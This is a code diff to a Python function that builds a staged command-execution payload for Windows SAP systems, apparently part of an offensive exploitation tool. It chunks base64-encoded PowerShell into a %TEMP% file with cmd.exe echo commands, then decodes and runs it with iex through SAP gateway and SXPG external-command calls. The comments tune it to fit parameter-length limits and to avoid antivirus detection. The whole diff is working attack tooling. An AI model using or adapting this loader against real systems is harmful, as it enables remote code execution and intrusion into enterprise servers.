@@ -389,7 +389,20 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     a final "command"/"params"/"long_params" that is the execute step.
     """
     import base64
-    tmp = r"C:\Windows\Temp\s"
+    # Use %TEMP% (cmd.exe env-var) / $env:TEMP (PowerShell) so the path
+    # resolves correctly on every Windows SAP system.  SAP sets %TEMP% to the
+    # instance work/tmp directory (e.g. P:\usr\sap\TWT\tmp on TWT), which the
+    # SAP service user always owns — unlike C:\Windows\Temp, which may have
+    # restricted ACLs or trigger AV on first access.
+    #
+    # Keep filename short ("s") — the SXPG -e base64 has a 255-byte PARAMS
+    # limit and every extra char in the decode_script costs ~2 base64 chars.
+    tmp_cmd = r"%TEMP%\s"       # expanded by cmd.exe at runtime
+    # For PowerShell, use a double-quoted string so $env:TEMP expands:
+    #   gc "$env:TEMP\s"
+    # Note: \" inside the outer "-quoted -c argument is a literal double-quote
+    # via CommandLineToArgvW parsing.
+    tmp_ps  = r"$env:TEMP\s"   # expanded by PowerShell at runtime
 
     # GW path: UTF-16LE Base64 (for PowerShell Unicode.GetString decode)
     enc_u16 = base64.b64encode(
@@ -403,38 +416,44 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     # executable path → ERROR_INVALID_HANDLE (6) / WaitForSingleObject failure.
     # long_params="" prevents old kernels from appending LONG_PARAMS to PARAMS.
     steps = [
-        # Clean up old files first
+        # Clean up old file first (suppress "not found" errors)
         {"command": "cmd.exe",
-         "params": f"/C del /q {tmp} {tmp}.ps1 2>nul",
+         "params": "/C del /q %TEMP%\\s 2>nul",
          "long_params": ""},
     ]
     for idx, chunk in enumerate(gw_chunks):
         redir = ">" if idx == 0 else ">>"
         steps.append({
             "command": "cmd.exe",
-            "params": f"/C echo {chunk}{redir}{tmp}",
+            "params": f"/C echo {chunk}{redir}{tmp_cmd}",
             "long_params": "",
         })
     run_cmd_prog   = "powershell"
-    run_cmd_params = (f"-nop -c \"$b=(gc '{tmp}')-join'';"
-                      f"iex([Text.Encoding]::Unicode.GetString("
-                      f"[Convert]::FromBase64String($b)))\"")
+    # Read temp file via $env:TEMP (expands at runtime in PowerShell).
+    # -replace removes any residual whitespace (e.g. trailing \r on some
+    # Windows versions) before base64 decoding.
+    # Inner \" are literal double-quotes via CommandLineToArgvW parsing.
+    run_cmd_params = ("-nop -c \"$b=((gc \\\"" + tmp_ps + "\\\")"
+                      "-join'')-replace'\\s','';iex([Text.Encoding]::"
+                      "Unicode.GetString([Convert]::FromBase64String($b)))\"")
     assert len(run_cmd_prog)   <= 128, f"Execute EXTPROG too long: {run_cmd_prog!r}"
     assert len(run_cmd_params) <= 255, f"Execute PARAMS too long: {len(run_cmd_params)}"
 
     # SXPG path: write ASCII Base64 chunks, decode+exec via
     # PowerShell -EncodedCommand (which encodes the DECODE script).
     # SXPG splits PARAMS at spaces but -e <base64> is just 2 tokens.
-    # Use C:\temp for short path (fits in 255-char PARAMS).
-    sxpg_tmp = r"C:\temp\s"
+    # Also uses %TEMP%/$env:TEMP so the SAP user always has write access.
+    sxpg_tmp_cmd = r"%TEMP%\s"     # cmd.exe side
+    sxpg_tmp_ps  = r"$env:TEMP\s"  # PowerShell side
     enc_ascii = base64.b64encode(
         ps_script.encode("ascii")).decode("ascii")
     sxpg_chunks = [enc_ascii[i:i+chunk_size]
                    for i in range(0, len(enc_ascii), chunk_size)]
-    # Build the decode+exec script, then encode IT for -e
-    decode_script = (f"iex([Text.Encoding]::ASCII.GetString("
-                     f"[Convert]::FromBase64String("
-                     f"-join(gc '{sxpg_tmp}'))))")
+    # Build the decode+exec script, then encode IT for -e.
+    # Double-quoted "$env:TEMP\sapmap_s" expands $env:TEMP at runtime.
+    decode_script = ('iex([Text.Encoding]::ASCII.GetString('
+                     '[Convert]::FromBase64String('
+                     f'-join(gc "{sxpg_tmp_ps}"))))')
     decode_enc = base64.b64encode(
         decode_script.encode("utf-16-le")).decode("ascii")
     sxpg_params = f"-nop -e {decode_enc}"
@@ -442,17 +461,15 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
         f"SXPG params too long: {len(sxpg_params)}")
 
     sxpg_steps = [
-        # Create C:\temp if it doesn't exist, clean old files
+        # %TEMP% always exists — just clean the old file if present
         {"command": "cmd.exe",
-         "params": f"/C mkdir {sxpg_tmp[:7]} 2>nul"},
-        {"command": "cmd.exe",
-         "params": f"/C del /q {sxpg_tmp} 2>nul"},
+         "params": f"/C del /q {sxpg_tmp_cmd} 2>nul"},
     ]
     for idx, chunk in enumerate(sxpg_chunks):
         redir = ">" if idx == 0 else ">>"
         sxpg_steps.append({
             "command": "cmd.exe",
-            "params": f"/C echo {chunk}{redir}{sxpg_tmp}",
+            "params": f"/C echo {chunk}{redir}{sxpg_tmp_cmd}",
         })
     return {
         "steps": steps,
